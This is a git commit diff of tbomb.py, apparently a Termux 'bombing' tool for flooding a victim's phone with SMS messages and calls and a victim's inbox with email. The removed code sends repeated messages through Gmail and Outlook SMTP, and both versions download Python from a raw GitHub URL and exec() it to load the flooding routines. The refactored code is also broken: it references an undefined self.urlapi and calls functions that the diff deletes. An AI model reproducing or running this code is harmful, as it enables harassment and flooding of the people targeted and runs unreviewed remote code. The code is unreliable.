9e1ae68ca837a3f801b1627216b9789af8930b6d
MAO-COMMUNITY <78520987+mao2116@users.noreply.github.com>
2021-12-11 21:28:58 +0600

    Update tbomb.py

--- tbomb.py
+++ tbomb.py
@@ -48,8 +48,9 @@ try:
   from pkg_resources import resource_string
   from core.user_agents import user_agent
   from core.logos import logomao
+  from core.ccchk import *
   from core.logos import *
-  #
+  
 except Exception as emao:
   maoversys=sys.version_info[0]==3
   if maoversys:
@@ -70,301 +71,156 @@ else:
 
 
 os.system('clear')
-agents = user_agent
-def authermao():
-  os.system('xdg-open https://github.com/mao2116')
 
-
-def autherthbd():
-  os.system('https://www.facebook.com/Termux.Hacker.Bd.Official/')
-def clr():
-  os.system("clear")
 
 def logomain2():
   clr()
   print(logomao)
 
-try:
-    from typing import List
-except ImportError:
-    pass #
-STR_TYPE = str
-RUNNING_PYTHON_2=sys.version_info[0]==2
-import tty, termios
-def getch():
-    fd = sys.stdin.fileno()
-    old_settings = termios.tcgetattr(fd)
-    try:
-        tty.setraw(sys.stdin.fileno())
-        ch = sys.stdin.read(1)
-    finally:
-        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
-    return ch
 
-def MAOPASSWORDSET(prompt='Password: ', mask='*'):
+class mao:
   
-
-    if not isinstance(prompt, STR_TYPE):
-        raise TypeError('prompt argument must be a str, not %s' % (type(prompt).__name__))
-    if not isinstance(mask, STR_TYPE):
-        raise TypeError('mask argument must be a zero- or one-character str, not %s' % (type(prompt).__name__))
-    if len(mask) > 1:
-        raise ValueError('mask argument must be a zero- or one-character str')
-
-    if mask == '' or sys.stdin is not sys.__stdin__:
-        import getpass as gp
-        return gp.getpass(prompt)
-
-    enteredPassword = [] # List[str]
-    sys.stdout.write(prompt)
-    sys.stdout.flush()
-    while True:
-        key = ord(getch())
-        if key == 13: # Enter key pressed.
-            if RUNNING_PYTHON_2:
-                sys.stdout.write(STR_TYPE('\n'))
-            else:
-                sys.stdout.write('\n')
-            return ''.join(enteredPassword)
-        elif key in (8, 127): # Backspace/Del key erases previous output.
-            if len(enteredPassword) > 0:
-                sys.stdout.write('\b \b')
-                
-                sys.stdout.flush()
-                enteredPassword = enteredPassword[:-1]
-        elif 0 <= key <= 31:
-            pass
-        else:
-            char = chr(key)
-            sys.stdout.write(mask)
-            sys.stdout.flush()
-            enteredPassword.append(char)
-
-
-  
-
-def psb(z):
+  def psb(self,z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.01)
-
-def mao3print(z):
+  def mao3print(self,z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.1)
 
-      
+  def ext(self):
+    exit("\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))    
 
-def ext():
-  exit("\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
-
-
-
-
-
-
-def usemail():
-  osc("clear")
-  print(logomao)
-  try:
-    maouser=input("{gcl}YOUR EMAIL{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl))
-    maopass=MAOPASSWORDSET(prompt="{gcl}EMAIL PASSWORD{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl),mask="*")
-    tomao=input("{gcl}TO{acl} :{ycl}".format(gcl=gcl,acl=acl,ycl=ycl))
-    headers=(' MAO WANNA FUCK YOU ')
-    subjectmao=input('{gcl}SUBJECT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
-    body=input('{gcl}MESSAGE{acl} :{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
-    threat=int(input('{gcl}THREAT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl)))
-  except KeyboardInterrupt:
-    exit("\n{acl}[ {rcl}! {acl}]{ycl} CANCELLED  {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
-  try:
-    
-    maoserver=smtplib.SMTP('smtp.gmail.com',587)
-  except:
-    exit('{acl}[ {rcl}! {acl}]{rcl} YOUR INTERNET CONNECTION IS TOO POOR {acl}[{rcl} !{acl} ]'.format(rcl=rcl,acl=acl))
-  maoserver.starttls()
-  try:
-    maoserver.login(maouser, maopass)
-  except smtplib.SMTPAuthenticationError:
-    print("{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS \n OR NEED TO ENABLE LESS SECURE APPS{ncl}".format(rcl=rcl,ncl=ncl))
-    os.system('xdg-open https://myaccount.google.com/lesssecureapps')
-    exit()
-  try:
-    i=1
-    for i in range(threat):
-      i=i+1
-      i2=str(i)
-      message='From: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'.format(maouser=maouser,headers=headers,subjectmao=subjectmao,body=body,i2=i2)
-      
-      maoserver.sendmail(maouser,tomao,message)
-      
-      print("{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !".format(gcl=gcl,acl=acl,rcl=rcl,i2=i2))
-      
-  except KeyboardInterrupt:
-    exit("{acl}[{rcl} !{acl} ] {rcl} ...ABORTING... {acl}[{rcl} !{acl} ]".format(rcl=rcl,acl=acl))
-def usoutmail():
-  osc("clear")
-  print(logomao)
-  try:
-    maouser=input("{gcl}YOUR EMAIL{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl))
-    maopass=MAOPASSWORDSET(prompt="{gcl}EMAIL PASSWORD{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl),mask="*")
-    tomao=input("{gcl}TO{acl} :{ycl}".format(gcl=gcl,acl=acl,ycl=ycl))
-    headers=(' MAO WANNA FUCK YOU ')
-    subjectmao=input('{gcl}SUBJECT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
-    body=input('{gcl}MESSAGE{acl} :{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
-    threat=int(input('{gcl}THREAT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl)))
-  except KeyboardInterrupt:
-    exit("{acl}[{rcl} !{acl} ] {rcl}CANCELLED {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl,))
-
-  try:
-    maoserver=smtplib.SMTP('smtp-mail.outlook.com',587)
-  except:
-    exit('{acl}[ {rcl}! {acl}]{rcl} YOUR INTERNET CONNECTION IS TOO POOR {acl}[{rcl} !{acl} ]'.format(rcl=rcl,acl=acl))
-  maoserver.ehlo()
-  maoserver.starttls()
-  try:
-    maoserver.login(maouser, maopass)
-  except smtplib.SMTPAuthenticationError:
-    exit("{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS.".format(rcl=rcl))
-    
-  try:
-    i=1
-    for i in range(threat):
-      i=i+1
-      i2=str(i)
-      message='From: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'.format(maouser=maouser,headers=headers,subjectmao=subjectmao,body=body,i2=i2)
-      maoserver.sendmail(maouser,tomao,message)
-      print("{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !".format(acl=acl,rcl=rcl,i2=i2,gcl=gcl))
-  except KeyboardInterrupt:
-    exit("{acl}[{rcl} !{acl} ] {rcl}...ABORTING... {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl,))
-def maocc1():
-  try:
-    
-    mao=open("core/cc_codes_mao.json","r")
-    mao=json.load(mao)
-    mao=mao["MAOCC_CODES"]
-    return mao
-  except Exception as emao:
-    exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
-print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
-print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
-try:
-  getsys=requests.session()
-  maopaste=getsys.get("https://raw.githubusercontent.com/mao2116/test/main/api/mao_api.py").text
-  exec(maopaste)
-except:
-  exit("\n{acl}[ {rcl}! {acl}]{ycl} API'S NOT LOADED {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
-def get_phone_info(maocc,maonumber):
-   
-      try:
-        cc =maocc
-        if not maocc1().get(cc, False):
-            exit("[ ! ] The COUNTRY CODE ({cc}) THAT YOU HAVE ENTERED IS INVALID OR UNSUPPORTED [ ! ]".format(cc=cc))
-        ccn=maocc1().get(cc)
-        target=maonumber
-        if ((len(target) <= 6) or (len(target) >= 12)):
-            exit("[ ! ] THE PHONE NUMBER ({target}) THAT YOU HAVE ENTERED IS INVALID [ ! ]\n".format(target=target))
-            
-        return (cc, target,ccn)
-      except KeyboardInterrupt:
-        exit("\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
-
-def main(): 
-
-   
-
-    logomao="""
-\033[1;33m {bcl}V.1.{gcl}4{ycl} _   _ \033[1;36m ____  ____  \033[1;32m   ____   ___  __  __ \033[1;30mTHBD\033[0;00m  
-\033[1;33m|_   _| | | |\033[1;36m| __ )|  _ \ \033[1;32m  | __ ) / _ \|  \/  | __ ) 
-\033[1;33m  | | | |_| |\033[1;36m|  _ \| | | | \033[1;32m |  _ \| | | | |\/| |  _ \ 
-\033[1;33m  | | |  _  |\033[1;36m| |_) | |_| |\033[1;32m  | |_) | |_| | |  | | |_) |
-\033[1;33m  |_| |_| |_|\033[1;36m|____/|____/\033[1;32m___|____/ \___/|_|  |_|____/ 
-                      |_\033[1;30mMAO\033[1;32m_|        
-                      
-                      
-                      
-                      
-                  \033[1;30m[ \033[1;34mAUTHER \033[1;30m] \033[1;32mTERMUX \033[1;32mHACKER\033[1;31m BD
-                  \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mMAO2116
-                  \033[1;30m[ \033[1;34mCODER  \033[1;30m] \033[1;30mMAO2116 
-\033[0;00m""".format(bcl=bcl,gcl=gcl,ycl=ycl)
-    print(logomao)
-    parser = argparse.ArgumentParser(description="")
-
-    #
-
+  def authermao(self):
+    os.system('xdg-open https://www.facebook.com/mAoVirUs2116/')
+  url="https://raw.githubusercontent.com/mao2116/test/main/api/mao_api.py"  
   
-
-    parser.add_argument('--bombing', dest='BOMBING', required="store_true",help="ENTER YOUR BOMBING TYPE sms/sms_call/email/outlook")
-    
- 
-    parser.add_argument('--cc', dest='COUNTRY_CODE',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 
-
-    parser.add_argument('--number', dest='NUMBER',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 
-
-    parser.add_argument('--threat', dest='THREAT',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 
-
-    parser.add_argument('--morelevels',dest='moreLevels',action='store_true') 
-
   
+  def autherthbd(self):
+    os.system('https://www.facebook.com/Termux.Hacker.Bd.Official/')
+  def clr():
+    os.system("clear")
+    
 
-    # parse args 
+
+
+
+
+  def main(self): 
+  
+     
+  
+      logomao="""
+  \033[1;33m {bcl}V.1.{gcl}3{ycl} _   _ \033[1;36m ____  ____  \033[1;32m   ____   ___  __  __ \033[1;30mTHBD\033[0;00m  
+  \033[1;33m|_   _| | | |\033[1;36m| __ )|  _ \ \033[1;32m  | __ ) / _ \|  \/  | __ ) 
+  \033[1;33m  | | | |_| |\033[1;36m|  _ \| | | | \033[1;32m |  _ \| | | | |\/| |  _ \ 
+  \033[1;33m  | | |  _  |\033[1;36m| |_) | |_| |\033[1;32m  | |_) | |_| | |  | | |_) |
+  \033[1;33m  |_| |_| |_|\033[1;36m|____/|____/\033[1;32m___|____/ \___/|_|  |_|____/ 
+                        |_\033[1;30mMAO\033[1;32m_|        
+                        
+                        
+                        
+                        
+                    \033[1;30m[ \033[1;34mAUTHER \033[1;30m] \033[1;32mTERMUX \033[1;32mHACKER\033[1;31m BD
+                    \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mMAO2116
+                    \033[1;30m[ \033[1;34mCODER  \033[1;30m] \033[1;30mMAO2116 
+  \033[0;00m""".format(bcl=bcl,gcl=gcl,ycl=ycl)
+      print(logomao)
+      parser = argparse.ArgumentParser(description="")
+  
+      #
+  
     
+  
+      parser.add_argument('--bombing', dest='BOMBING', required="store_true",help="ENTER YOUR BOMBING TYPE sms/sms_call/mail")
+  
+      parser.add_argument('--mail', dest="MAIL_NAME",help="ENTER YOUR VICTIM MAIL")
+  
+      
+   
+      parser.add_argument('--cc', dest='COUNTRY_CODE',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 
+  
+      parser.add_argument('--number', dest='NUMBER',help="VICTIM NUMBER [[ ONLY NEED FOR SMS/SMS_CALL BOMBING ]]") 
+  
+      parser.add_argument('--threat', dest='THREAT',help="LIMIT OF BOMBING") 
+  
+      parser.add_argument('--morelevels',dest='moreLevels',action='store_true') 
+  
     
-    args = parser.parse_args() 
-    maothreat=0
-    if args.BOMBING=='sms':
-      try:
-        maothreat=int(args.THREAT)
+  
+      # parse args 
+      
+      
+      args = parser.parse_args() 
+      maothreat=0
+      
+      if args.BOMBING=='sms':
+        try:
+          maothreat=int(args.THREAT)
+          
+        except:
+          print("[ ! ] ENTER BOMBING THREAT [ ! ] \n")
+        if maothreat <=1000:
+            pass
+        else:
+            exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))
+  
+        maocc=str(args.COUNTRY_CODE)
+        maonumber=str(args.NUMBER)
+        get_phone_info(maocc,maonumber)
+        ccn=get_phone_info(maocc,maonumber)[2]
+        print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
+        print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
+
+        maopaste=requests.get(self.urlapi).text
+        exec(maopaste)
+  
+        mainbomb(maothreat,maocc,maonumber,ccn)
+      elif args.BOMBING=="sms_call":
+        maothreat =0
+        try:
+          maothreat=int(args.THREAT)
+          
         
-      except:
-        print("[ ! ] ENTER BOMBING THREAT [ ! ] \n")
-      if maothreat <=1000:
-          pass
+        except:
+          print("{acl}[ {rcl}!{acl} ]{rcl} ENTER BOMBING THREAT {acl}[{rcl} ! {acl}] \n{ncl}".format(acl=acl,rcl=rcl,ncl=ncl))
+        if maothreat <=1000:
+            pass
+        else:
+            exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))  
+        maocc=str(args.COUNTRY_CODE)
+        maonumber=str(args.NUMBER)
+        get_phone_info(maocc,maonumber)
+        ccn=get_phone_info(maocc,maonumber)[2]
+        print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
+        print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
+
+        maopaste=requests.get(self.urlapi).text
+        exec(maopaste)
+        smsandcall(maothreat,maocc,maonumber,ccn)
+      elif args.BOMBING =="mail":
+        threat=args.THREAT
+        mail=args.MAIL_NAME
+        print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
+        print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
+
+        maopaste=requests.get(self.urlapi).text
+        exec(maopaste)
+        mails(mail,threat)
+  
       else:
-          exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))
-
-      maocc=str(args.COUNTRY_CODE)
-      maonumber=str(args.NUMBER)
-      get_phone_info(maocc,maonumber)
-      ccn=get_phone_info(maocc,maonumber)[2]
-      mainbomb(maothreat,maocc,maonumber,ccn)
-    elif args.BOMBING=="sms_call":
-      maothreat =0
-      try:
-        maothreat=int(args.THREAT)
-        
-      
-      except:
-        print("{acl}[ {rcl}!{acl} ]{rcl} ENTER BOMBING THREAT {acl}[{rcl} ! {acl}] \n{ncl}".format(acl=acl,rcl=rcl,ncl=ncl))
-      if maothreat <=1000:
-          pass
-      else:
-          exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))  
-      maocc=str(args.COUNTRY_CODE)
-      maonumber=str(args.NUMBER)
-      get_phone_info(maocc,maonumber)
-      ccn=get_phone_info(maocc,maonumber)[2]
-      smsandcall(maothreat,maocc,maonumber,ccn)
-    elif args.BOMBING=="email":
-      usemail()
-    elif args.BOMBING=="outlook":
-      usoutmail()
-    else:
-      authermao()
-      exit("{acl}[{rcl} !{acl} ] {rcl}TRY WITH CORRECT BOMBING TYPE {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl))
+        self.authermao()
+        exit("{acl}[{rcl} !{acl} ] {rcl}TRY WITH CORRECT BOMBING TYPE {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl))
       
       
       
 
 
-if __name__ == '__main__': 
-
-    main()
     
-    
-    
+mao().main()    
 ##########################################################
 # DEV : EKRAMUL HASSAN
 # Github : https://github.com/mao2116
